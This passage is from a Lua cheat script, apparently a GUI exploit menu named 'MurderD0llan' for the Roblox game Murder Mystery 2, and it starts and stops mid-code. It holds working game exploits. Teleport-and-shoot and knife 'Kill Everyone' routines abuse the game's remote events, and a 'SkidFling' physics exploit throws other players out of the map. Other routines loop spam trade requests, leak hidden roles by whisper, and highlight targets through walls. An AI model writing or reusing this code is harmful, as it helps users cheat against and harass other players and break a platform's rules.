		predictedPosition = predictedPosition * (((localplayer:GetNetworkPing() * 1000) * ((offsetToPingMult - 1) * 0.01)) + 1)
		-- failed so hard i had to revert back to v1.11 :sob:

		--predictedPosition = Vector3.new(predictedPositiomurdererHRP.Position + ((murdererVelocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) + murderer.Character.Humanoid.MoveDirection * shootOffsetn.X, math.clamp(predictedPosition.Y, playerPosition.Y - 2, playerPosition.Y + 2), predictedPosition.Z)


		return predictedPosition
	end


	local localPlayer = game:GetService("Players").LocalPlayer
	local function Shoot(targetPlayer: Player)
		local targetChar = targetPlayer.Character
		if not targetChar then return end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then return end

		local predictedPosition = targetHRP.Position + shootOffset

		local gun = localPlayer.Character and localPlayer.Character:FindFirstChild("Gun")
		if not gun then return end

		local createBeamRF = gun:FindFirstChild("KnifeLocal") and gun.KnifeLocal:FindFirstChild("CreateBeam")
		if not (createBeamRF and createBeamRF:IsA("RemoteFunction")) then
			errornotify("Missing 'CreateBeam' RemoteFunction.")
			return
		end

		local args = {
			[1] = 1,
			[2] = predictedPosition,
			[3] = "AH2"
		}

		createBeamRF:InvokeServer(unpack(args))
	end

	local function SherrifKill(targetPlayer: Player)
		if not (targetPlayer and targetPlayer.Character) then 
			errornotify("Invalid target player or missing character.")
			return 
		end

		local localChar = localPlayer.Character
		local humanoid = localChar and localChar:FindFirstChildWhichIsA("Humanoid")
		if not humanoid then 
			errornotify("Local player's humanoid not found.")
			return 
		end

		local gun = localPlayer.Backpack:FindFirstChild("Gun") or localChar:FindFirstChild("Gun")
		if not gun then
			errornotify("No gun named 'Gun' found in inventory or character.")
			return
		end

		-- Equip the gun
		if gun.Parent == localPlayer.Backpack then
			humanoid:EquipTool(gun)
			task.wait(0.1)
		end

		local originalCFrame = localChar:GetPivot()

		-- Teleport behind the target
		local targetChar = targetPlayer.Character
		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then
			errornotify("Target's HumanoidRootPart not found.")
			return
		end

		local backPosition = targetHRP.CFrame * CFrame.new(0, 0, 3)
		localChar:PivotTo(backPosition)

		-- Repeatedly shoot for up to 15 seconds or until target is dead
		local startTime = tick()
		local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")

		if not targetHumanoid then
			errornotify("Target's Humanoid not found.")
			return
		end


		while targetHumanoid.Health > 0 and tick() - startTime <= 15 do
			Shoot(targetPlayer)
			task.wait(0.2)
		end

		if targetHumanoid.Health <= 0 then
			sucessnotify("Target eliminated successfully.")
		else
			warningnotify("Timeout: Target wasn't killed within 15 seconds.")
		end

		-- Unequip the gun
		humanoid:UnequipTools()
		task.wait(0.1)

		-- Return to original position
		localChar:PivotTo(originalCFrame)
	end


	local function findMurderer()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("knife") then
				return i
			end
		end

		return nil
	end

	local function findSheriff()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Gun") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Gun") then
				return i
			end
		end



		return nil
	end

	SearchTargetBox.Parent.MouseButton1Click:Connect(function()
		--select Murderer as a target
		local Murderer = findMurderer()
		local Sherrif = findSheriff()
		if Murderer == target then
			AssignTarget(Sherrif)
		else
			AssignTarget(Murderer)
		end
	end)
	MouseButton1Click("Kill  ", function()
		--dectect if LocalPlayer is murder or sherrif then do action
		local murderer = findMurderer()
		local sheriff = findSheriff()
		if murderer and sheriff then
			local TargetToKill = target
			if typeof(TargetToKill) == "Instance" and TargetToKill:IsA("Player") then
				if game.Players.LocalPlayer.Name == murderer.Name then
					MurderKill(TargetToKill)
				elseif game.Players.LocalPlayer.Name == sheriff.Name then
					SherrifKill(TargetToKill)
				else
					errornotify("You are not the Sheriff or the Murderer")
				end
			else
				errornotify("Invalid Args (target is not a Player)")
			end
		else
			errornotify("No murder / sheriff is found or the round has not started.")
		end
	end)

	local Player = game:GetService("Players").LocalPlayer
	local function SkidFling(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		if not TargetPlayer or not TargetPlayer.Character then
			errornotify("Target player is invalid or has no character.")
			return
		end

		local TCharacter = TargetPlayer.Character
		local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		local TRootPart = THumanoid and THumanoid.RootPart
		local THead = TCharacter:FindFirstChild("Head")
		local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		local Handle = Accessory and Accessory:FindFirstChild("Handle")

		if not Character or not Humanoid or not RootPart then
			errornotify("Your character is not fully loaded.")
			return
		end

		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
			errornotify("Target player has no BasePart.")
			return
		end

		sucessnotify("Fling started on target: " .. TargetPlayer.Name)

		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end

		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end

		local function FPos(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end

		local function SFBasePart(BasePart)
			local TimeToWait = 2
			local Time = tick()
			local Angle = 0

			repeat
				if RootPart and THumanoid then
					if BasePart.Velocity.Magnitude < 50 then
						Angle = Angle + 100

						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
					else
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
					end
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
		end

		workspace.FallenPartsDestroyHeight = 0/0

		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		if TRootPart and THead then
			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
				SFBasePart(THead)
			else
				SFBasePart(TRootPart)
			end
		elseif TRootPart then
			SFBasePart(TRootPart)
		elseif THead then
			SFBasePart(THead)
		elseif Handle then
			SFBasePart(Handle)
		else
			errornotify("No valid fling target part found.")
		end

		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid

		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
			Humanoid:ChangeState("GettingUp")
			for _, x in ipairs(Character:GetChildren()) do
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

		workspace.FallenPartsDestroyHeight = getgenv().FPDH

		sucessnotify("Fling finished successfully.")
	end


	MouseButton1Click("Fling  ", function()
		if target then 
			task.spawn(function()
				SkidFling(target)
			end)
		else
			errornotify("No target selected. set target manually.")
		end
	end)

	MouseButton1Click("Teleport  ", function()
		if target then
			localPlayer.Character:PivotTo(target.Character:GetPivot())
		else
			errornotify("No target selected. set target manually.")
		end
	end)
	local TextChatService = game:GetService("TextChatService")
	local TextChannels = TextChatService:WaitForChild("TextChannels")
	local RBXGeneralChannel = TextChannels:WaitForChild("RBXGeneral")

	local function SendToTheChat(message: string)
		pcall(function()
			RBXGeneralChannel:SendAsync(message)
		end)
	end

	local Loops1 = {
		TellSherrifAndMurder = false,
		TellGunDroppedAndTraps = false,
		HelpWhenMurderOrSherrif = false,
		NotifyWhenKilled = false,
		ViewTarget = false,
		NotifyNewRole = false,
		LoopFling = false,
		LoopTrade = false,
	}

	local function TellSherrifAndMurderToPlayer(player: Player)
		if not player or not player:IsA("Player") then return end
		if not Loops1.TellSherrifAndMurder then return end

		local sheriff = findSheriff()
		local murderer = findMurderer()

		if not sheriff or not murderer then
			errornotify("Sheriff or Murderer could not be found.")
			return
		end

		local message = sheriff.Name .. " is Sheriff, " .. murderer.Name .. " is Murderer."

		-- Whisper to both DisplayName and Username (covers nickname/display variations)
		SendToTheChat("/w " .. player.DisplayName .. " " .. message)
		SendToTheChat("/w " .. player.Name .. " " .. message)
	end

	local tellButton = script.Parent:WaitForChild("tellsherrifandmurder")
	local toggleFrame = tellButton:WaitForChild("Frame")

	local ChildAddedConnection

	tellButton.MouseButton1Click:Connect(function()
		Loops1.TellSherrifAndMurder = not Loops1.TellSherrifAndMurder

		if Loops1.TellSherrifAndMurder then
			toggleFrame.BackgroundColor3 = Color3.fromRGB(58, 193, 71)

			ChildAddedConnection = workspace.ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(15, function()
						local targetPlayer = target
						if not targetPlayer then
							errornotify("No target to send Sheriff and Murderer info.")
							return
						end

						TellSherrifAndMurderToPlayer(targetPlayer)
					end)
				end
			end)
		else
			toggleFrame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
			if ChildAddedConnection then
				ChildAddedConnection:Disconnect()
				ChildAddedConnection = nil
			end
		end
	end)

	local function TellGunDropped(model: Model)
		if not target or not target:IsA("Player") then return end
		--tell to the target the Model Distance in target
		if not model or not model:IsA("Model") then return end
		if not model.PrimaryPart then return end
		local distance = (target.Character:GetPivot().Position - model:GetPivot().Position).Magnitude
		local message = "The " .. model.Name .. " is " .. math.floor(distance) .. " studs away from you."
		SendToTheChat("/w " .. target.DisplayName .. " " .. message)
		SendToTheChat("/w " .. target.Name .. " " .. message)
	end

	local function TellTrapPlacedByMurder(Model: Model)
		if not target or not target:IsA("Player") then return end
		if not Model or not Model:IsA("Model") then return end
		if not Model.PrimaryPart then return end
		local distance = (target.Character:GetPivot().Position - Model:GetPivot().Position).Magnitude
		local message = "The Murderer placed a trap " .. math.floor(distance) .. " studs away from you."
		SendToTheChat("/w " .. target.DisplayName .. " " .. message)
		SendToTheChat("/w " .. target.Name .. " " .. message)
	end
	local TellGunDroppedAndTrap = script.Parent.telltrapsandgundropped

	local GTChildAddedConnection
	TellGunDroppedAndTrap.MouseButton1Click:Connect(function()
		Loops1.TellGunDroppedAndTraps = not Loops1.TellGunDroppedAndTraps
		if Loops1.TellGunDroppedAndTraps then
			TellGunDroppedAndTrap.Frame.BackgroundColor3 = Color3.fromRGB(58, 193, 71)
			GTChildAddedConnection = workspace.ChildAdded:Connect(function(child)
				if child.Name == "GunDrop" and Loops1.TellGunDroppedAndTraps then
					TellGunDropped(child)
				elseif child.Name == "trap" and Loops1.TellGunDroppedAndTraps then
					TellTrapPlacedByMurder(child)
				end
			end)
		else
			TellGunDroppedAndTrap.Frame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
			if GTChildAddedConnection then
				GTChildAddedConnection:Disconnect()
				GTChildAddedConnection = nil
			end
		end

	end)
	local helpButton = script.Parent.helpwhenmurdersherrif

	local ChildAddedBackPackTarget -- Declaramos la conexión fuera para poder desconectarla

	local function handleHelpButtonClick()
		Loops1.HelpWhenMurdererOrSheriff = not Loops1.HelpWhenMurdererOrSheriff
		local isHelpEnabled = Loops1.HelpWhenMurdererOrSheriff

		helpButton.Frame.BackgroundColor3 = isHelpEnabled and Color3.fromRGB(58, 193, 71) or Color3.fromRGB(170, 0, 0) -- Cambia a rojo si está desactivado

		-- Desconectar la conexión anterior si existe
		if ChildAddedBackPackTarget then
			ChildAddedBackPackTarget:Disconnect()
			ChildAddedBackPackTarget = nil
		end

		if isHelpEnabled and target then -- Asegurarse de que 'target' esté definida y la ayuda esté habilitada
			ChildAddedBackPackTarget = target.Backpack.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					task.delay(2, function() -- Usamos task.delay en lugar de wait para evitar bloqueos
						local murderer = findMurderer()
						local sheriff = findSheriff()
						local localPlayerName = game.Players.LocalPlayer.Name
						local targetName = target.Name
						local targetDisplayName = target.DisplayName

						if murderer and sheriff then -- Asegurarse de que ambos roles existen
							if murderer.Name == targetName and sheriff.Name ~= localPlayerName then
								task.spawn(function()
									SkidFling(sheriff)
									task.wait(3) -- Usamos task.wait en lugar de wait
									SkidFling(sheriff) -- Hacerlo de vuelta por si acaso
								end)
							elseif sheriff.Name == targetName and murderer.Name ~= localPlayerName then
								SendToTheChat("/w "..targetDisplayName.." The Murder Is "..murderer.Name)
								task.wait(1) -- Usamos task.wait en lugar de wait
								SendToTheChat("/w "..targetDisplayName.." say OK in these 60 seconds if you want to kill murderer.")

								local TemporalConnection
								TemporalConnection = target.Chatted:Connect(function(message)
									if string.lower(message) == "ok" then
										SkidFling(murderer)
										if TemporalConnection then
											TemporalConnection:Disconnect()
										end
									end
								end)
								--TIMEOUT CONNECTION IN 60 SECONDS
								task.delay(60, function()
									if TemporalConnection then
										TemporalConnection:Disconnect()
									end
								end)
							end
						end
					end)
				end
			end)
		end
	end

	helpButton.MouseButton1Click:Connect(handleHelpButtonClick)
	local OnKilledConnection
	local OnKilledNotifyButton = script.Parent:WaitForChild("notifywhenkilled")

	-- Función para conectar el evento Died del humanoid
	local function connectToHumanoidDied()
		if Loops1 and target and target.Character then
			local humanoid = target.Character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				-- Desconecta la conexión anterior si existe
				if OnKilledConnection then
					OnKilledConnection:Disconnect()
				end

				OnKilledConnection = humanoid.Died:Connect(function()
					if Loops1.NotifyWhenKilled then
						warningnotify(target.Name .. " died or got killed.")

						-- Espera a que el Character se regenere
						local function waitForNewCharacter()
							if target then
								target.CharacterAdded:Wait()
								-- Da un poco de tiempo para que el nuevo Humanoid se cargue
								task.spawn(function()
									repeat task.wait() until target.Character:FindFirstChildOfClass("Humanoid")
									if Loops1.NotifyWhenKilled then
										connectToHumanoidDied() -- Reconecta con el nuevo Humanoid
									end
								end)
							end
						end

						-- Ejecuta en segundo plano
						task.spawn(waitForNewCharacter)
					end
				end)
			end
		end
	end

	-- Conexión al botón
	OnKilledNotifyButton.MouseButton1Click:Connect(function()
		-- Alterna el estado de la notificación
		if not target then return end

		Loops1.NotifyWhenKilled = not Loops1.NotifyWhenKilled

		if Loops1.NotifyWhenKilled  then
			connectToHumanoidDied()
			OnKilledNotifyButton.Frame.BackgroundColor3 = Color3.new(0, 1, 0)
		else
			if OnKilledConnection then
				OnKilledNotifyButton.Frame.BackgroundColor3 = Color3.new(1, 0, 0)
				OnKilledConnection:Disconnect()
				OnKilledConnection = nil
			end
		end
	end)

	local IsViewingConnection
	local ViewTargetButton = script.Parent:WaitForChild("view")

	local player = game.Players.LocalPlayer
	local camera = workspace.CurrentCamera

	ViewTargetButton.MouseButton1Click:Connect(function()
		Loops1.ViewTarget = not Loops1.ViewTarget

		if Loops1.ViewTarget and target and target.Character then
			local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				ViewTargetButton.Frame.BackgroundColor3 = Color3.new(0, 1, 0)
				-- Establece la cámara para seguir al target
				camera.CameraSubject = humanoid
				camera.CameraType = Enum.CameraType.Custom

				-- Opcional: actualiza el CameraSubject si el personaje del target cambia
				if IsViewingConnection then
					IsViewingConnection:Disconnect()
				end

				IsViewingConnection = target.CharacterAdded:Connect(function(newCharacter)
					local newHumanoid = newCharacter:WaitForChild("Humanoid", 5)
					if newHumanoid and Loops1.ViewTarget then
						camera.CameraSubject = newHumanoid
					end
				end)
			end
		else
			-- Restaurar la cámara al jugador local
			camera.CameraSubject = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
			camera.CameraType = Enum.CameraType.Custom

			-- Desconectar seguimiento si estaba activo
			if IsViewingConnection then
				ViewTargetButton.Frame.BackgroundColor3 = Color3.new(1, 0, 0)
				IsViewingConnection:Disconnect()
				IsViewingConnection = nil
			end
		end
	end)


	local NotifyNewRoleConnection
	local NotifyOnTargetNewRole = script.Parent:WaitForChild("notifywhennewrole")

	NotifyOnTargetNewRole.MouseButton1Click:Connect(function()
		if not target then return end
		Loops1.NotifyNewRolet = not Loops1.NotifyNewRole

		-- Si activamos la opción
		if Loops1.NotifyNewRole then
			-- Desconectar conexión anterior si existe
			if NotifyNewRoleConnection then
				NotifyNewRoleConnection:Disconnect()
			end
			NotifyOnTargetNewRole.Frame .BackgroundColor3 = Color3.new(0, 1, 0)
			-- Asegurarse de que el Backpack existe
			local backpack = target:FindFirstChild("Backpack")
			if backpack then
				NotifyNewRoleConnection = backpack.ChildAdded:Connect(function(child)
					task.wait(3)

					if not Loops1.NotifyNewRole then return end

					-- Verifica si el target es sheriff o murderer
					if findSheriff() == target then
						errornotify(target.Name .. " is the SHERIFF.")
					elseif findMurderer() == target then
						errornotify(target.Name .. " is the MURDERER.")
					end
				end)
			end
		else
			-- Si desactivamos, desconectar
			if NotifyNewRoleConnection then
				NotifyOnTargetNewRole.Frame .BackgroundColor3 = Color3.new(1, 0, 0)
				NotifyNewRoleConnection:Disconnect()
				NotifyNewRoleConnection = nil
			end
		end
	end)


	local LoopFlingConnection

	local LoopFlingButton = script.Parent.loopflingantiplay


	LoopFlingButton.MouseButton1Click:Connect(function()
		if not target then return end
		Loops1.LoopFling = not Loops1.LoopFling

		if Loops1.TellSherrifAndMurder then
			toggleFrame.BackgroundColor3 = Color3.fromRGB(58, 193, 71)

			LoopFlingConnection = workspace.ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(15, function()
						local targetPlayer = target
						if not targetPlayer then
							errornotify("No target to Fling")
							return
						end

						SkidFling(target)
					end)
				end
			end)
		else
			toggleFrame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
			if LoopFlingConnection then
				LoopFlingConnection:Disconnect()
				LoopFlingConnection = nil
			end
		end
	end)




	local Players = game:GetService("Players")
	local AntiMurderButton = script.Parent:WaitForChild("antimurder")
	local AntiMurderFrame = AntiMurderButton:WaitForChild("Frame")

	local AntiMurderConnectionWorkspaceChildAdded
	local AntiMurderEnabled = false

	AntiMurderButton.MouseButton1Click:Connect(function()
		AntiMurderEnabled = not AntiMurderEnabled

		if AntiMurderEnabled then
			AntiMurderFrame.BackgroundColor3 = Color3.fromRGB(58, 193, 71)

			AntiMurderConnectionWorkspaceChildAdded = workspace.ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(13, function()
						local currentTarget = target
						local murderer = findMurderer()

						if currentTarget and currentTarget == murderer then
							SkidFling(currentTarget)
						end
					end)
				end
			end)
		else
			AntiMurderFrame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
			if AntiMurderConnectionWorkspaceChildAdded then
				AntiMurderConnectionWorkspaceChildAdded:Disconnect()
				AntiMurderConnectionWorkspaceChildAdded = nil
			end
		end
	end)

	local EspConnection
	local EspIsActive = false

	local Special_ESP_button = script.Parent:WaitForChild("specialesp")
	local EspFrame = Special_ESP_button:WaitForChild("Frame")

	local function applyHighlightToCharacter(character)
		if not character or not character:IsA("Model") then return end

		-- Evita duplicados
		if character:FindFirstChild("SpecialESP_Highlight") then return end

		local highlight = Instance.new("Highlight")
		highlight.Name = "SpecialESP_Highlight"
		highlight.FillColor = Color3.fromRGB(255, 0, 212)
		highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
		highlight.FillTransparency = 0.3
		highlight.OutlineTransparency = 0
		highlight.Adornee = character
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Parent = character
	end

	local function removeHighlightFromCharacter(character)
		if character and character:IsA("Model") then
			local hl = character:FindFirstChild("SpecialESP_Highlight")
			if hl then
				hl:Destroy()
			end
		end
	end

	Special_ESP_button.MouseButton1Click:Connect(function()
		EspIsActive = not EspIsActive

		if EspIsActive then
			EspFrame.BackgroundColor3 = Color3.fromRGB(58, 193, 71)

			if target and target.Character then
				applyHighlightToCharacter(target.Character)
			end

			if EspConnection then EspConnection:Disconnect() end
			if target then
				EspConnection = target.CharacterAdded:Connect(function(newCharacter)
					if EspIsActive then
						applyHighlightToCharacter(newCharacter)
					end
				end)
			end
		else
			EspFrame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)

			if target and target.Character then
				removeHighlightFromCharacter(target.Character)
			end

			if EspConnection then
				EspConnection:Disconnect()
				EspConnection = nil
			end
		end
	end)


	local LoopTradeEnabled = false
	local LoopTradeButton = script.Parent.looptrade
	local isLoopRunning = false  -- Variable para controlar si el bucle ya está corriendo

	LoopTradeButton.MouseButton1Click:Connect(function()
		LoopTradeEnabled = not LoopTradeEnabled

		if LoopTradeEnabled then
			LoopTradeButton.Frame.BackgroundColor3 = Color3.fromRGB(35, 193, 0)

			-- Iniciar el bucle solo si no está corriendo
			if not isLoopRunning then
				isLoopRunning = true
				task.spawn(function()
					while LoopTradeEnabled do
						wait(0.5)
						local args = {
							target
						}
						-- Enviar la solicitud de intercambio
						game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
					end
					isLoopRunning = false -- Se desactiva el control cuando el bucle termina
				end)
			end
		else
			LoopTradeButton.Frame.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
		end
	end)


	MouseButton1Click("Check Role  ", function()
		local Sherrif = findSheriff()
		local Murder = findMurderer()
		local TargetToCheckRole = target
		if TargetToCheckRole.Name == Sherrif.Name then
			sucessnotify("Sherrif")
		elseif TargetToCheckRole.Name == Murder.Name then
			warningnotify("Murder")
		else
			sucessnotify("Innocent")
		end
	end)

	function getMap()
		for _, o in ipairs(workspace:GetChildren()) do
			if o:FindFirstChild("CoinContainer") and o:FindFirstChild("Spawns") then
				return o
			end
		end
		return nil
	end

	MouseButton1Click("In Round  ", function()
		local Map = getMap()
		local TargetToCheck = target
		if Map then
			--if player is near to any spawn in the map then is a yes
			for _, o in ipairs(Map.Spawns:GetChildren()) do
				if (o.Position - TargetToCheck.Character.HumanoidRootPart.Position).magnitude < 40 then
					sucessnotify("Yes")
					break
				else
					warningnotify("No")
					break
				end
			end
		end
	end)

	MouseButton1Click("Check Pro Player", function()
		sucessnotify("this function still in work, try again later.")
	end)

	-----------------
	local MurderD0llanAdmin = require(script.Parent.Parent.Parent.Parent.HelpModules["MurderD0llanAdminModule"])

	local GiveAdminButton = script.Parent.giveAdmin
	local frameBGC3GAB = GiveAdminButton:WaitForChild("Frame")

	-- Define colores (puedes cambiarlos según tu estilo)
	local whilelistedColor = Color3.fromRGB(0, 170, 0)   -- Verde
	local notWhilelistedColor = Color3.fromRGB(170, 0, 0) -- Rojo

	-- Comprueba si el jugador está en la whitelist
	local function IsPlayerWhilelisted(player: Player): boolean
		local list = MurderD0llanAdmin.whilelistedList()
		for _, p in pairs(list) do
			if p == player then
				return true
			end
		end
		return false
	end

	-- Cambia el color de fondo del botón según el estado
	local function ChangeBGC3(isWhilelisted: boolean)
		if isWhilelisted then
			frameBGC3GAB.BackgroundColor3 = whilelistedColor
		else
			frameBGC3GAB.BackgroundColor3 = notWhilelistedColor
		end
	end

	-- Alternar admin: agregar o quitar dependiendo del estado
	local function ToggleAdminForPlayer(player: Player)
		if IsPlayerWhilelisted(player) then
			MurderD0llanAdmin.unwhilelist(player)
			ChangeBGC3(false)
		else
			MurderD0llanAdmin.whilelist(player)
			ChangeBGC3(true)
		end
	end

	-- Botón presionado
	GiveAdminButton.MouseButton1Click:Connect(function()
		if target then
			ToggleAdminForPlayer(target)
		end
	end)

	-- Función pública para actualizar visualmente el botón al cambiar el target
	function UpdateUIForTarget()
		if target then
			ChangeBGC3(IsPlayerWhilelisted(target))
		end
	end

end;
task.spawn(C_ac);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.HandlerV3
local function C_fb()
	local script = G2L["fb"];
	local contenedorBusqueda = script.Parent -- Cambia esto a la ruta del objeto donde quieres buscar
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end
	local Players = game:GetService("Players")
	local Parent = script.Parent

	local function MouseButton1Click(TextToSearch: string, Function)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				if game:GetService("RunService"):IsStudio() then
					print("[MurderD0llan]: "..TextToSearch.." - Found")
				end
				v.MouseButton1Click:Connect(Function)
			end
		end
	end

	local localplayer = game:GetService("Players").LocalPlayer
	local bypassKE = false

	local function HidePlayer(player: Player)
		--hides every part from player character
		if not player then return end
		if not player.Character then return end
		if not player.Character:FindFirstChild("Humanoid") then return end
		player.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		for _, bodyPart in pairs(player.Character:GetDescendants()) do
			if bodyPart:IsA("BasePart") then
				bodyPart.Transparency = 1
			end
		end

	end

	local function FindButton(TextToSearch: string)
		for _, instancee in pairs(contenedorBusqueda:GetChildren()) do
			if instancee:IsA("TextButton") and instancee.Text:lower() == TextToSearch:lower() then
				print(instancee:GetFullName().." found")
				return instancee
			end
		end
	end

	local function FindButtonWithMatchedString(TextToSearch: string)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				print(v:GetFullName().." found")
				return v
			end
		end
	end

	MouseButton1Click("Kill Everyone", function()

		if not localplayer.Character:FindFirstChild("Knife") then
			local hum = localplayer.Character:FindFirstChild("Humanoid")
			if localplayer.Backpack:FindFirstChild("Knife") then
				localplayer.Character:FindFirstChild("Humanoid"):EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
			else
				errornotify("knife not dectected - try again")
				return
			end
		end

		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player ~= localplayer then
				player.Character:FindFirstChild("HumanoidRootPart").Anchored = true
				player.Character:FindFirstChild("HumanoidRootPart").CFrame = localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame + localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 1 

			end	
		end

		local args = {
			[1] = "Slash"
		}
		localplayer.Character.Knife.Stab:FireServer(unpack(args))
	end)

	local function killAsMURDERER(player: Player)

		if not localplayer.Character:FindFirstChild("Knife") then
			local hum = localplayer.Character:FindFirstChild("Humanoid")
			if localplayer.Backpack:FindFirstChild("Knife") then
				localplayer.Character:FindFirstChild("Humanoid"):EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
			else
				errornotify("knife not dectected - try again")
				return
			end
		end


		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player ~= localplayer then
			HidePlayer(player)
			player.Character:FindFirstChild("HumanoidRootPart").Anchored = true
			player.Character:FindFirstChild("HumanoidRootPart").CFrame = localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame + localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 1 
		end	


		local args = {
			[1] = "Slash"
		}
		localplayer.Character.Knife.Stab:FireServer(unpack(args))
	end


	local function killAsMURDERERBypass(player: Player)

		if not localplayer.Character:FindFirstChild("Knife") then
			local hum = localplayer.Character:FindFirstChild("Humanoid")
			if localplayer.Backpack:FindFirstChild("Knife") then
				localplayer.Backpack:FindFirstChild("Knife").Parent = localplayer.Character
			else
